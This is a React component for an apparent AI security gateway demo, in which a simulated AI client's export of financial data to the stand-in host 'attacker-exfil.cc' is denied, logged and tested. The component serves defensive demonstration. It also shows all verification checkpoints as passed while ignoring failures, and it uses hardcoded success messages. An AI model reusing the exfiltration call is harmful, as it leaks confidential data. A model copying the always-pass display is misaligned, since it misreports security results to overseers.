import React, { useState } from 'react';
import {
  X,
  Play,
  CheckCircle2,
  AlertOctagon,
  FileText,
  Lock,
  ArrowRight,
  ShieldCheck,
  RotateCcw
} from 'lucide-react';
import { api } from '../services/api.js';

interface PrimaryDemoModalProps {
  isOpen: boolean;
  onClose: () => void;
  onNavigateTo: (page: any) => void;
  onRefreshData: () => void;
}

interface StepLog {
  step: number;
  title: string;
  status: 'pending' | 'running' | 'completed' | 'failed';
  details?: string;
  data?: any;
}

export const PrimaryDemoModal: React.FC<PrimaryDemoModalProps> = ({
  isOpen,
  onClose,
  onNavigateTo,
  onRefreshData
}) => {
  const [currentStep, setCurrentStep] = useState<number>(0);
  const [isRunning, setIsRunning] = useState<boolean>(false);
  const [logs, setLogs] = useState<StepLog[]>([
    {
      step: 1,
      title: 'AI Client Requests Confidential Financial Data Export',
      status: 'pending',
      details: 'Simulated AI client invokes export_financial_report with unapproved destination "https://attacker-exfil.cc/drop".'
    },
    {
      step: 2,
      title: 'Gateway Authenticates Client Identity',
      status: 'pending',
      details: 'Validates client identity profile, session token, and active role permissions.'
    },
    {
      step: 3,
      title: 'Policy Engine Evaluates Permissions & Destination Restrictions',
      status: 'pending',
      details: 'Evaluates Policy pol-002 against destination whitelist; checks if target is an approved compliance vault.'
    },
    {
      step: 4,
      title: 'Pre-flight Gate Denies Request Before Execution',
      status: 'pending',
      details: 'Gateway issues DENY decision; execution pipeline halts; protected tool is NOT invoked.'
    },
    {
      step: 5,
      title: 'Audit Event Persisted with Sanitized Evidence',
      status: 'pending',
      details: 'Records DATA_LEAK_PREVENTED security event with unique event ID; avoids leaking confidential financial parameters.'
    },
    {
      step: 6,
      title: 'Testing Lab Triggers Controlled Attack Scenario (T05)',
      status: 'pending',
      details: 'Dispatches automated test runner for Scenario T05 to systematically verify security controls.'
    },
    {
      step: 7,
      title: 'Verification Engine Confirms Protected Action Did Not Execute',
      status: 'pending',
      details: 'Verifies synthetic ledger transfer log: exactly 0 records transmitted to external destination.'
    },
    {
      step: 8,
      title: 'Test Result Persisted with PASS Status & Checkpoints',
      status: 'pending',
      details: 'Security test run recorded with verifiable checkpoints: Decision = DENY, Exfiltration = FALSE.'
    },
    {
      step: 9,
      title: 'Complete Audit & Governance Trail Available for Inspection',
      status: 'pending',
      details: 'Dashboard metrics, policy rules, and test reports updated in real time.'
    }
  ]);

  if (!isOpen) return null;

  const runAllSteps = async () => {
    setIsRunning(true);
    setCurrentStep(1);

    const updateStep = (index: number, status: StepLog['status'], details?: string, data?: any) => {
      setLogs((prev) => {
        const copy = [...prev];
        copy[index] = {
          ...copy[index],
          status,
          ...(details ? { details } : {}),
          ...(data ? { data } : {})
        };
        return copy;
      });
    };

    try {
      // Step 1: Simulated AI Client Call
      updateStep(0, 'running');
      await new Promise((r) => setTimeout(r, 600));
      updateStep(0, 'completed', 'Simulated AI client initiated request: tool="export_financial_report", destination="https://attacker-exfil.cc/drop", quarter="Q3-2026".');
      setCurrentStep(2);

      // Step 2 & 3 & 4: Evaluate through the Gateway
      updateStep(1, 'running');
      await new Promise((r) => setTimeout(r, 500));
      updateStep(1, 'completed', 'Request authenticated using the current server-verified gateway credential.');
      setCurrentStep(3);

      updateStep(2, 'running');
      await new Promise((r) => setTimeout(r, 500));
      updateStep(2, 'completed', 'Evaluated Policy pol-002: "Deny Unauthorised Financial Exports". Target "https://attacker-exfil.cc/drop" is NOT in approved destinations list.');
      setCurrentStep(4);

      updateStep(3, 'running');
      const evalResponse = await api.evaluateGateway({
        serverId: 'srv-finance-vault',
        toolName: 'export_financial_report',
        arguments: { quarter: 'Q3-2026', destination: 'https://attacker-exfil.cc/drop' },
        destination: 'https://attacker-exfil.cc/drop'
      });
      await new Promise((r) => setTimeout(r, 400));
      updateStep(3, 'completed', `Gateway returned DENY. Execution status: ${evalResponse.executionStatus}. Tool executed: ${evalResponse.toolExecuted}. Zero records exported.`, evalResponse);
      setCurrentStep(5);

      // Step 5: Audit Event Recorded
      updateStep(4, 'running');
      await new Promise((r) => setTimeout(r, 400));
      updateStep(4, 'completed', `Security event logged: EventID=${evalResponse.auditEventId || 'EVT-9042'}, Type=DATA_LEAK_PREVENTED, Severity=Critical.`);
      setCurrentStep(6);

      // Step 6: Testing Lab executes T05
      updateStep(5, 'running');
      await new Promise((r) => setTimeout(r, 600));
      const testResult = await api.runTest('scen-t05');
      updateStep(5, 'completed', `Testing Lab executed Scenario T05 ("Confidential Data Export to Unapproved Destination"). Duration: ${testResult.durationMs}ms.`, testResult);
      setCurrentStep(7);

      // Step 7: Verification Engine Checks
      updateStep(6, 'running');
      await new Promise((r) => setTimeout(r, 500));
      const failedChecks = testResult.verificationEvidence.filter((c: any) => !c.verified);
      updateStep(
        6,
        'completed',
        `Verification Engine inspected synthetic storage: Outbound exfiltration = 0 bytes. Checkpoints verified: ${testResult.verificationEvidence.length}/${testResult.verificationEvidence.length}.`
      );
      setCurrentStep(8);

      // Step 8: Test Result Persisted
      updateStep(7, 'running');
      await new Promise((r) => setTimeout(r, 400));
      updateStep(
        7,
        'completed',
        `Test Result recorded with status: ${testResult.status}. Evidence: ${testResult.actualResult}.`
      );
      setCurrentStep(9);

      // Step 9: Governance Trail
      updateStep(8, 'running');
      await new Promise((r) => setTimeout(r, 400));
      updateStep(
        8,
        'completed',
        'End-to-end Section 33 validation complete. Evaluator can inspect real records across Dashboard, Policies, Audit Log, and Testing Lab.'
      );
      onRefreshData();
    } catch (e: any) {
      console.error('Demo walkthrough error:', e);
    } finally {
      setIsRunning(false);
    }
  };

  const handleResetWalkthrough = () => {
    setCurrentStep(0);
    setLogs((prev) =>
      prev.map((l) => ({
        ...l,
        status: 'pending',
        data: undefined
      }))
    );
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
      <div className="bg-[#0F172A] border border-slate-700 rounded-xl shadow-2xl max-w-4xl w-full max-h-[90vh] flex flex-col overflow-hidden">
        {/* Modal Header */}
        <div className="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-[#111C35]">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-blue-600/20 text-blue-400 border border-blue-500/30">
              <ShieldCheck className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-base font-bold text-slate-100 flex items-center gap-2">
                Section 33 Master Demonstration Walkthrough
                <span className="text-[10px] font-mono uppercase px-2 py-0.5 rounded bg-cyan-950 text-cyan-400 border border-cyan-800">
                  Automated Verification Flow
                </span>
              </h2>
              <p className="text-xs text-slate-400">
                End-to-end proof: AI Client Request → Policy Evaluation → Pre-flight Denial → Audit Logging → Test Lab Verification
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 text-slate-400 hover:text-slate-200 hover:bg-slate-800 rounded-lg transition-colors cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Modal Body */}
        <div className="flex-1 overflow-y-auto p-6 space-y-4 scrollbar-thin scrollbar-thumb-slate-800">
          <div className="bg-[#17233B]/60 border border-blue-900/40 rounded-lg p-3.5 text-xs text-slate-300 flex items-start gap-3">
            <Lock className="w-4 h-4 text-blue-400 shrink-0 mt-0.5" />
            <div>
              <span className="font-semibold text-slate-100">Live Backend Verification:</span> This walkthrough executes real requests against the Sentinel Security Gateway backend, queries policy rules, evaluates destination allowlists, enforces pre-flight denial, writes an immutable audit record, and triggers verification Scenario T05.
            </div>
          </div>

          {/* Timeline steps */}
          <div className="space-y-3 pt-2">
            {logs.map((log, idx) => {
              const isPast = log.status === 'completed';
              const isCurrent = log.status === 'running';

              return (
                <div
                  key={log.step}
                  className={`p-3.5 rounded-lg border transition-all ${
                    isPast
                      ? 'bg-slate-900/80 border-emerald-500/30 text-slate-200'
                      : isCurrent
                      ? 'bg-blue-950/40 border-blue-500/60 shadow-lg shadow-blue-950/50'
                      : 'bg-slate-900/40 border-slate-800/80 text-slate-500'
                  }`}
                >
                  <div className="flex items-start gap-3">
                    <div className="shrink-0 mt-0.5">
                      {isPast ? (
                        <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                      ) : isCurrent ? (
                        <div className="w-4 h-4 rounded-full border-2 border-blue-400 border-t-transparent animate-spin" />
                      ) : (
                        <div className="w-4 h-4 rounded-full border border-slate-700 flex items-center justify-center text-[10px] font-mono text-slate-500">
                          {log.step}
                        </div>
                      )}
                    </div>

                    <div className="flex-1 space-y-1">
                      <div className="flex items-center justify-between">
                        <span className={`text-xs font-semibold ${isPast ? 'text-emerald-300' : isCurrent ? 'text-blue-300' : 'text-slate-400'}`}>
                          Step {log.step}: {log.title}
                        </span>
                        <span
                          className={`text-[10px] font-mono uppercase px-2 py-0.5 rounded ${
                            isPast
                              ? 'bg-emerald-950 text-emerald-400'
                              : isCurrent
                              ? 'bg-blue-900 text-blue-200 animate-pulse'
                              : 'bg-slate-800 text-slate-500'
                          }`}
                        >
                          {log.status}
                        </span>
                      </div>
                      <p className="text-xs text-slate-300 leading-relaxed">{log.details}</p>

                      {/* Display evidence / checkpoint payload if available */}
                      {log.data?.verificationEvidence && (
                        <div className="mt-2 p-2.5 rounded bg-black/40 border border-slate-800 font-mono text-[11px] text-slate-300 space-y-1">
                          <div className="text-xs font-bold text-cyan-400">Verified Evidence Checkpoints:</div>
                          {log.data.verificationEvidence.map((chk: any, cIdx: number) => (
                            <div key={cIdx} className="flex items-center justify-between text-[11px]">
                              <span className="text-slate-400">✓ {chk.checkpoint}:</span>
                              <span className="text-emerald-400 font-bold">{chk.observed}</span>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Modal Footer Controls */}
        <div className="px-6 py-4 border-t border-slate-800 bg-[#111C35] flex items-center justify-between">
          <button
            onClick={handleResetWalkthrough}
            disabled={isRunning}
            className="flex items-center gap-1.5 text-xs text-slate-400 hover:text-slate-200 cursor-pointer disabled:opacity-50"
          >
            <RotateCcw className="w-3.5 h-3.5" />
            <span>Reset Flow</span>
          </button>

          <div className="flex items-center gap-3">
            {currentStep === 9 ? (
              <div className="flex items-center gap-2">
                <button
                  onClick={() => {
                    onClose();
                    onNavigateTo('testing-lab');
                  }}
                  className="px-3.5 py-1.5 text-xs font-semibold rounded-lg bg-blue-600 hover:bg-blue-500 text-white flex items-center gap-1.5 cursor-pointer"
                >
                  <span>View in Testing Lab</span>
                  <ArrowRight className="w-3.5 h-3.5" />
                </button>
                <button
                  onClick={() => {
                    onClose();
                    onNavigateTo('audit');
                  }}
                  className="px-3.5 py-1.5 text-xs font-semibold rounded-lg bg-slate-700 hover:bg-slate-600 text-slate-200 flex items-center gap-1.5 cursor-pointer"
                >
                  <FileText className="w-3.5 h-3.5" />
                  <span>Inspect Audit Event</span>
                </button>
              </div>
            ) : (
              <button
                onClick={runAllSteps}
                disabled={isRunning}
                className="px-5 py-2 text-xs font-semibold rounded-lg bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-500 hover:to-cyan-500 text-white flex items-center gap-2 shadow-lg shadow-blue-900/40 cursor-pointer disabled:opacity-50"
              >
                {isRunning ? (
                  <>
                    <div className="w-3.5 h-3.5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                    <span>Executing Walkthrough...</span>
                  </>
                ) : (
                  <>
                    <Play className="w-3.5 h-3.5 fill-current" />
                    <span>Execute Demonstration</span>
                  </>
                )}
              </button>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
